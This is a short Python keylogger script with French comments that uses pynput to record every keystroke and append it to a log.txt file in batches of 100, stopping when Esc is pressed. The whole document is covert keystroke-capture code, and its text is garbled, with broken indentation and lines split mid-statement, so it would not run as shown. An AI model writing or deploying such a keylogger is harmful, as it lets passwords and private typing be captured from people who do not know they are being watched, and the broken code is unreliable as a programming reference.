import pynput
from pynput.keyboard import Key, Listener
compteur=0
inputT = []


def on_press(key):
  global inputT, compteur
  inputT.append(key) # ajout chaque caractère tableau
  compteur+=1
  if compteur >= 100: # tous les 100 caractères save dans
fichiers
  compteur = 0
  write_file(inputT)
  inputT=[] #buffer init 0
  
  
def write_file(inputT):
  with open("log.txt","a") as f: #sauvegarde input dans fichier
  for key in inputT:
    k = str(key).replace("'","") # remplace les quotes
    if k.find("space") >0: # espace taper = saut de ligne
      f.write('\n')
     elif k.find("Key") == -1:
      f.write(k)
      
# stop le script
def on_release(key):
  if key == Key.esc:
    return False
with Listener(on_press=on_press, on_release=on_release) as
listener:
  listener.join()
